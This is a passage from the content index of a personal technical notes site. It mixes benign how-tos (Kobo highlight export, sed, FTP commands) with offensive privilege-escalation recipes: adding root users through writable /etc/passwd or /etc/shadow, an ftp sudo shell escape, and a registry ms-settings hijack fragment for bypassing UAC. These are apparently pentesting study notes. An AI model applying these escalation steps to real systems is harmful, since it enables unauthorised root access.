style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;cmd.exe /c start powershell.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Force&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;    &lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;New-Item&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Path &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;HKCU:\\Software\\Classes\\ms-settings\\CurVer&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Force&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Set-ItemProperty&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;  &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;HKCU:\\Software\\Classes\\ms-settings\\CurVer&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Name &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;(default)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;value &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.pwn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Force&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Exploit-weak-etc-passwd-permissions":{"slug":"spells/Exploit-weak-etc-passwd-permissions","filePath":"spells/Exploit weak etc-passwd permissions.md","title":"Exploit weak /etc/passwd permissions","links":[],"tags":["HowTo","OS/Linux","AttackCycle/PrivEsc"],"content":"If /etc/passwd has weak permissions, then passwords in it can be replaced (since Linux systems still use the password hashes in /etc/passwd preferentially to those in /etc/shadow). This means that we can just directly add root-equivalent users directly there (remember that the UID and primary GID can be duplicated!).\nTo generate a password acceptable for inclusion in /etc/passwd:\nopenssl passwd -1 -salt $SALT $PASSWORD","richContent":"&lt;p&gt;&lt;em&gt;If&lt;/em&gt; /etc/passwd has weak permissions, then passwords in it can be replaced (since Linux systems still use the password hashes in /etc/passwd preferentially to those in /etc/shadow). This means that we can just directly add root-equivalent users directly there (remember that the UID and primary GID can be duplicated!).&lt;/p&gt;\n&lt;p&gt;To generate a password acceptable for inclusion in /etc/passwd:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;openssl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; passwd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -salt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $SALT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PASSWORD&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Exploit-weak-etc-shadow-permissions":{"slug":"spells/Exploit-weak-etc-shadow-permissions","filePath":"spells/Exploit weak etc-shadow permissions.md","title":"Exploit weak /etc/shadow permissions","links":[],"tags":["HowTo","OS/Linux","AttackCycle/PrivEsc"],"content":"If /etc/shadow has weak permissions, then passwords in it can be replaced. To create a new password, use:\nmkpasswd -m sha-512 $PASSWORD","richContent":"&lt;p&gt;&lt;em&gt;If&lt;/em&gt; /etc/shadow has weak permissions, then passwords in it can be replaced. To create a new password, use:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mkpasswd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -m&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; sha-512&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PASSWORD&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Export-highlights-and-annotations-from-Kobo-eReaders":{"slug":"spells/Export-highlights-and-annotations-from-Kobo-eReaders","filePath":"spells/Export highlights and annotations from Kobo eReaders.md","title":"Export highlights and annotations from Kobo eReaders","links":[],"tags":["HowTo","Hardware/Kobo"],"content":"Open up D:\\.kobo\\Kobo\\Kobo eReader.conf (where D: is the Kobo’s mount point) and add (or modify) the following block:\n[FeatureSettings]\nExportHighlights=true\nThis should add a new menu option for a given book (accessible in My Books) allowing highlights and annotations to be extracted to the root of the Kobo mount.","richContent":"&lt;p&gt;Open up &lt;code&gt;D:\\.kobo\\Kobo\\Kobo eReader.conf&lt;/code&gt; (where &lt;code&gt;D:&lt;/code&gt; is the Kobo’s mount point) and &lt;a href=&quot;https://web.archive.org/web/20200405061523/https%3A%2F%2Fmedium.com%2F%40angeldan1989%2Fhow-to-export-notes-highlights-annotations-from-kobo-ereaders-20606b7159b6&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;add (or modify) the following block&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;ini&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;ini&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;FeatureSettings&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;ExportHighlights&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This should add a new menu option for a given book (accessible in My Books) allowing highlights and annotations to be extracted to the root of the Kobo mount.&lt;/p&gt;"},"spells/Extract-the-webpage-title-from-a-URL":{"slug":"spells/Extract-the-webpage-title-from-a-URL","filePath":"spells/Extract the webpage title from a URL.md","title":"Extract the webpage title from a URL","links":[],"tags":["HowTo","Language/Python","OS/Linux/Distros/Debian"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\nAdapted from How do I get a websites title using command line?\n\n\n\npython3 -c &quot;import bs4, requests; print(bs4.BeautifulSoup(requests.get(&#039;$URL&#039;).text).title.text)&quot;\nThis needs the python3-bs4 package on Debian-based distribution. Note that we use the .text method instead of .content to ensure that we get back a Unicode string (rather than just the raw bytes, which can and will get mangled by anything you pipe this into).\n\n\n                  \n                  Warning\n                  \n                \n\n\nThis won’t work on webpages for sites like Twitter that set the &lt;title/&gt; using JavaScript after initial page load.\n\n\n","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Adapted from &lt;a href=&quot;https://unix.stackexchange.com/questions/103252/how-do-i-get-a-websites-title-using-command-line/563920#563920&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;How do I get a websites title using command line?&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;python3&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -c&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;import bs4, requests; print(bs4.BeautifulSoup(requests.get(&#039;$URL&#039;).text).title.text)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This needs the python3-bs4 package on Debian-based distribution. &lt;a href=&quot;https://stackoverflow.com/a/12843406&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Note that we use the .text method instead of .content to ensure that we get back a Unicode string&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; (rather than just the raw bytes, which can and will get mangled by anything you pipe this into).&lt;/p&gt;\n&lt;blockquote class=&quot;callout warning&quot; data-callout=&quot;warning&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Warning&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;This won’t work on webpages for sites like Twitter that set the &lt;code&gt;&amp;#x3C;title/&gt;&lt;/code&gt; using JavaScript after initial page load.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;"},"spells/FTP":{"slug":"spells/FTP","filePath":"spells/FTP.md","title":"FTP","links":["spells/Transfer-files-over-FTP-using-netcat","spells/FTPS","spells/sudo"],"tags":["Application/ftp","Protocol/FTP","Application/sudo","AttackCycle/PrivEsc"],"content":"Commands\n\nLIST — List contents of the supplied directory (or user’s FTP root)\nPASS — Specify the password for the account logging on\nPASV — Switch to passive mode\nQUIT — End the current session/connection\nRETR — Retrieve the provided file\nSTAT — Provide connection/server information\nSYST — Provide system “type” information\nTYPE — Switch between ASCII (A) and binary (I) transfer modes\nUSER — Specify the username for the account logging on\n\nThere are a lot more obscure commands as well, though the above is sufficient for basic operations.\nFile transfers\nTransclude of Transfer-files-over-FTP-using-netcat\nFTPS\nTransclude of FTPS\nftp binary shell escape\nIf the ftp binary can be run with NOPASSWD via sudo, then you can break out into a root shell using !/bin/sh.","richContent":"&lt;h2 id=&quot;commands&quot;&gt;Commands&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#commands&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;https://www.serv-u.com/resource/tutorial/appe-stor-stou-retr-list-mlsd-mlst-ftp-command&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;LIST&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; — List contents of the supplied directory (or user’s FTP root)&lt;/li&gt;\n&lt;li&gt;PASS — Specify the password for the account logging on&lt;/li&gt;\n&lt;li&gt;PASV — Switch to passive mode&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://www.serv-u.com/resource/tutorial/quit-user-abor-acct-syst-xdel-ftp-command&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;QUIT&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; — End the current session/connection&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://www.serv-u.com/resource/tutorial/appe-stor-stou-retr-list-mlsd-mlst-ftp-command&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;RETR&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; — Retrieve the provided file&lt;/li&gt;\n&lt;li&gt;STAT — Provide connection/server information&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://www.serv-u.com/resource/tutorial/quit-user-abor-acct-syst-xdel-ftp-command&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;SYST&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; — Provide system “type” information&lt;/li&gt;\n&lt;li&gt;TYPE — Switch between ASCII (A) and binary (I) transfer modes&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://www.serv-u.com/resource/tutorial/quit-user-abor-acct-syst-xdel-ftp-command&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;USER&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; — Specify the username for the account logging on&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;There are a lot more obscure commands as well, though the above is sufficient for basic operations.&lt;/p&gt;\n&lt;h2 id=&quot;file-transfers&quot;&gt;File transfers&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#file-transfers&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Transfer-files-over-FTP-using-netcat&quot; data-block=&quot;&quot; data-embed-alias=&quot;Transfer files over FTP using netcat&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Transfer-files-over-FTP-using-netcat&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Transfer-files-over-FTP-using-netcat&quot;&gt;Transclude of Transfer-files-over-FTP-using-netcat&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;ftps&quot;&gt;FTPS&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#ftps&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;FTPS&quot; data-block=&quot;&quot; data-embed-alias=&quot;FTPS&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/FTPS&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/FTPS&quot;&gt;Transclude of FTPS&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;ftp-binary-shell-escape&quot;&gt;ftp binary shell escape&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#ftp-binary-shell-escape&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;If the ftp binary can be &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;run with NOPASSWD via sudo&lt;/a&gt;, then you can break out into a root shell using &lt;code&gt;!/bin/sh&lt;/code&gt;.&lt;/p&gt;"},"spells/FTPS":{"slug":"spells/FTPS","filePath":"spells/FTPS.md","title":"FTPS","links":["spells/FTP"],"tags":["Protocol/FTPS"],"content":"FTPS (FTP over SSL) uses port 990 by default. Mostly supplanted by SFTP.","richContent":"&lt;p&gt;FTPS (&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/FTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/FTP&quot;&gt;FTP&lt;/a&gt; over SSL) uses port 990 by default. Mostly supplanted by SFTP.&lt;/p&gt;"},"spells/Find-and-replace-a-single-line-in-a-large-text-file":{"slug":"spells/Find-and-replace-a-single-line-in-a-large-text-file","filePath":"spells/Find and replace a single line in a large text file.md","title":"Find and replace a single line in a large text file","links":[],"tags":["Application/sed","HowTo"],"content":"To display a single line from a large text file:\nsed -n &quot;${LINE_NUMBER}{p;q}&quot; $FILE\nThe p command prints matching lines, and the q command causes sed to quit after the first match.\nYou can’t use q if you want to print a block of lines, so you’ll just need to ^C after the output is printed so that sed doesn’t keep needlessly reading the file.\nsed -n &quot;${START_LINE},${END_LINE}p&quot; $FILE\nIf you want to replace a single line, you can use a similar trick (once you’ve identified the line number):\nsed -i &quot;${LINE_NUMBER}s/.*/${REPLACEMENT_TEXT}/&quot; $FILE\nIt may be advisable to use single quote here, rather than double quotes + variable substitution, to prevent shell weirdness. Unfortunately, there’s really no way to tell when this command has finished (except to let it work through the whole file).","richContent":"&lt;p&gt;To &lt;a href=&quot;http://stackoverflow.com/a/2796347&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;display a single line from a large text file&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sed&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;LINE_NUMBER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;{p;q}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The &lt;code&gt;p&lt;/code&gt; command prints matching lines, and the &lt;code&gt;q&lt;/code&gt; command causes sed to quit after the first match.&lt;/p&gt;\n&lt;p&gt;You can’t use &lt;code&gt;q&lt;/code&gt; if you want to print a block of lines, so you’ll just need to &lt;code&gt;^C&lt;/code&gt; after the output is printed so that sed doesn’t keep needlessly reading the file.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sed&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span 